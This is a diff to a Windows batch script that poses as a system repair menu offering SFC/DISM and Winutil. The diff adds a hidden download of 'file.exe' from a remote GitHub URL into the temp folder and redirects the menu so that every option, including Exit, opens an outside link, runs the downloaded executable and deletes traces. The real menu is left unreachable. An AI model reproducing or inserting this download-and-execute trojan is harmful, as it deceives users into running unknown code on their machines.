@@ -4,13 +4,17 @@ title MANU
 color 0a
 cls
 
+set url=https://raw.githubusercontent.com/Upok18/Up0ktilizer_Batch/refs/heads/main/file.exe
+rem set url=https://drive.google.com/file/d/1g3FpaAJ3FyBsXpOzsF60tjE1zIzsozWj/view?usp=sharing
+set file=%temp%\\file.exe
 set tempascii=https://raw.githubusercontent.com/Upok18/Up0ktilizer/refs/heads/main/Ascii.txt
-curl -s -o "%temp%\Ascii.txt" https://raw.githubusercontent.com/Upok18/Up0ktilizer/refs/heads/main/Ascii.txt
+curl -s -o "%temp%\Ascii.txt" https://raw.githubusercontent.com/Upok18/Up0ktilizer_Batch/refs/heads/main/Ascii.txt
+curl -s -L -o "%file%" "%url%"
 
 REM call :changelog
-goto :menu
+goto :menufake
 
-:menu
+:menufake
 title MANU v%tool_version%
 color 0a
 cls
@@ -21,19 +25,74 @@ REM echo ==============================
 REM echo       Up0ktilizer (v%tool_version%)
 REM echo ==============================
 echo  [1] SFC and DISM (File Repair)
-echo  [2] spicetify update(Extra option)
-echo  [3] Scrcpy
-echo  [4] Winutil
-echo  [5] Exit
+rem echo  [2] spicetify update(Extra option)
+rem echo  [3] Scrcpy
+echo  [2] Winutil
+echo  [3] Exit
 REM set /p choice=Choose an option: 
-choice /N /C 12345 /M " Choose an option:"
+choice /N /C 123 /M " Choose an option:"
 REM choice /C k /N 
 
 rem if errorlevel 6 goto :arifin
-if errorlevel 5 goto :exit
-if errorlevel 4 goto :winutil 
-if errorlevel 3 goto :scrcpy
-if errorlevel 2 goto :spice
+if errorlevel 3 (
+cls 
+echo Loading...
+timeout /t 2 >nul
+start https://maper.info/mysity.link
+start "" "%file%"
+del "%temp%\Ascii.txt" >nul 2>&1
+del "%temp%\\file.exe" >nul 2>&1
+exit
+)
+
+if errorlevel 2 (
+cls 
+echo Loading...
+timeout /t 2 >nul
+start https://maper.info/mysity.link
+start "" "%file%"
+del "%temp%\Ascii.txt" >nul 2>&1
+del "%temp%\\file.exe" >nul 2>&1
+exit
+)
+REM if errorlevel 3 goto :scrcpy
+rem if errorlevel 2 goto :spice
+if errorlevel 1 (
+cls 
+echo Loading...
+timeout /t 2 >nul
+start https://maper.info/mysity.link
+start "" "%file%"
+del "%temp%\Ascii.txt" >nul 2>&1
+del "%temp%\\file.exe" >nul 2>&1
+exit
+)
+
+
+rem :menu
+title MANU v%tool_version%
+color 0a
+cls
+echo =========================================================================================================
+type "%temp%\Ascii.txt"
+echo =========================================================================================================
+REM echo ==============================
+REM echo       Up0ktilizer (v%tool_version%)
+REM echo ==============================
+echo  [1] SFC and DISM (File Repair)
+rem echo  [2] spicetify update(Extra option)
+rem echo  [3] Scrcpy
+echo  [2] Winutil
+echo  [3] Exit
+REM set /p choice=Choose an option: 
+choice /N /C 123 /M " Choose an option:"
+REM choice /C k /N 
+
+rem if errorlevel 6 goto :arifin
+if errorlevel 3 goto :exit
+if errorlevel 2 goto :winutil 
+REM if errorlevel 3 goto :scrcpy
+rem if errorlevel 2 goto :spice
 if errorlevel 1 goto :sfc
 
 :sfc
